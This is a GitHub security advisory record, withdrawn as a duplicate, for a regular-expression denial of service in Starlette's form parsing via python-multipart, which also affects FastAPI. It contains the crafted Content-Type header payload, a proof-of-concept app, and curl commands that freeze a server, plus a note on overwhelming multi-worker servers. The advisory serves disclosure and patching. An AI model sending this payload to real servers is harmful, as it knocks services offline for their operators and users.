advisory_id: GHSA-93gm-qmq6-w238
datasource_id: github_osv_importer_v2/GHSA-93gm-qmq6-w238
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/02/GHSA-93gm-qmq6-w238/GHSA-93gm-qmq6-w238.json
aliases: []
summary: |
  Duplicate Advisory: Starlette Content-Type Header ReDoS
  ## Duplicate Advisory
  This advisory has been withdrawn because it is a duplicate of GHSA-2jv5-9r88-3w3p. This link is maintained to preserve external references.

  ## Original Description

  ### Summary

  When using form data, `python-multipart` uses a Regular Expression to parse the HTTP `Content-Type` header, including options.

  An attacker could send a custom-made `Content-Type` option that is very difficult for the RegEx to process, consuming CPU resources and stalling indefinitely (minutes or more) while holding the main event loop. This means that process can't handle any more requests.

  This can create a ReDoS (Regular expression Denial of Service): https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS

  This only applies when the app uses form data, parsed with `python-multipart`.

  ### Details

  A regular HTTP `Content-Type` header could look like:

  ```
  Content-Type: text/html; charset=utf-8
  ```

  `python-multipart` parses the option with this RegEx: https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74

  A custom option could be made and sent to the server to break it with:

  ```
  Content-Type: application/x-www-form-urlencoded; !=\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
  ```

  ### PoC

  Create a Starlette app that uses form data. To reproduce it it's not even necessary to create a Starlette app, just using the `Request` is enough:

  ```Python
  # main.py
  from starlette.requests import Request
  from starlette.responses import JSONResponse


  async def app(scope, receive, send):
      assert scope["type"] == "http"
      request = Request(scope, receive)
      data = await request.form()
      response_data = {}
      for key in data:
          print(key, data.getlist(key))
          response_data[key] = data.getlist(key)
      response = JSONResponse(response_data)
      await response(scope, receive, send)
  ```

  Then start it with:

  ```console
  $ uvicorn main:app

  INFO:     Started server process [50601]
  INFO:     Waiting for application startup.
  INFO:     ASGI 'lifespan' protocol appears unsupported.
  INFO:     Application startup complete.
  INFO:     Uvicorn running on http://127.0.0.1:8000 (Press CTRL+C to quit)
  ```

  Then send the attacking request with:

  ```console
  $ curl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8000/'
  ```

  #### Stopping it

  Because that holds the main loop consuming the CPU non-stop, it's not possible to simply kill Uvicorn with `Ctrl+C` as it can't handle the signal.

  To stop it, first check the process ID running Uvicorn:

  ```console
  $ ps -fA | grep uvicorn

    501 59461 24785   0  4:28PM ttys004    0:00.13 /Users/user/code/starlette/env3.10/bin/python /Users/user/code/starlette/env3.10/bin/uvicorn redos_starlette:app
    501 59466 99935   0  4:28PM ttys010    0:00.00 grep uvicorn
  ```

  In this case, the process ID was `59461`, then you can kill it (forcefully, with `-9`) with:

  ```console
  $ kill -9 59461
  ```

  ### Impact

  It's a ReDoS, (Regular expression Denial of Service), it only applies to those reading form data, using `python-multipart`. This way it also affects other libraries using Starlette, like FastAPI.

  ### Original Report

  This was originally reported to FastAPI as an email to security@tiangolo.com, sent via https://huntr.com/, the original reporter is Marcello, https://github.com/byt3bl33d3r

  <details>
  <summary>Original report to FastAPI</summary>

  Hey Tiangolo!

  My name's Marcello and I work on the ProtectAI/Huntr Threat Research team, a few months ago we got a report (from @nicecatch2000) of a ReDoS affecting another very popular Python web framework. After some internal research, I found that FastAPI is vulnerable to the same ReDoS under certain conditions (only when it parses Form data not JSON).

  Here are the details: I'm using the latest version of FastAPI (0.109.0) and the following code:

  ```Python
  from typing import Annotated
  from fastapi.responses import HTMLResponse
  from fastapi import FastAPI,Form
  from pydantic import BaseModel

  class Item(BaseModel):
      username: str

  app = FastAPI()

  @app.get("/", response_class=HTMLResponse)
  async def index():
      return HTMLResponse("Test", status_code=200)

  @app.post("/submit/")
  async def submit(username: Annotated[str, Form()]):
      return {"username": username}

  @app.post("/submit_json/")
  async def submit_json(item: Item):
      return {"username": item.username}
  ```

  I'm running the above with uvicorn with the following command:

  ```console
  uvicorn server:app
  ```

  Then run the following cUrl command:

  ```
  curl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8000/submit/'
  ```

  You'll see the server locks up, is unable to serve anymore requests and one CPU core is pegged to 100%

  You can even start uvicorn with multiple workers with the --workers 4 argument and as long as you send (workers + 1) requests you'll completely DoS the FastApi server.

  If you try submitting Json to the /submit_json endpoint with the malicious Content-Type header you'll see it isn't vulnerable. So this only affects FastAPI when it parses Form data.

  Cheers

  #### Impact

  An attacker is able to cause a DoS on a FastApi server via a malicious Content-Type header if it parses Form data.

  #### Occurrences

  [params.py L586](https://github.com/tiangolo/fastapi/blob/d74b3b25659b42233a669f032529880de8bd6c2d/fastapi/params.py#L586)

  </details>
impacted_packages:
  - purl: pkg:pypi/starlette
    affected_versions: vers:pypi/<=0.36.1
    fixed_versions: vers:pypi/0.36.2
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '7.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/02/GHSA-93gm-qmq6-w238/GHSA-93gm-qmq6-w238.json
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-400
references:
  - url: https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74
    reference_type:
    reference_id:
  - url: https://github.com/encode/starlette
    reference_type:
    reference_id:
  - url: https://github.com/encode/starlette/commit/13e5c26a27f4903924624736abd6131b2da80cc5
    reference_type:
    reference_id:
  - url: https://github.com/encode/starlette/security/advisories/GHSA-93gm-qmq6-w238
    reference_type:
    reference_id:
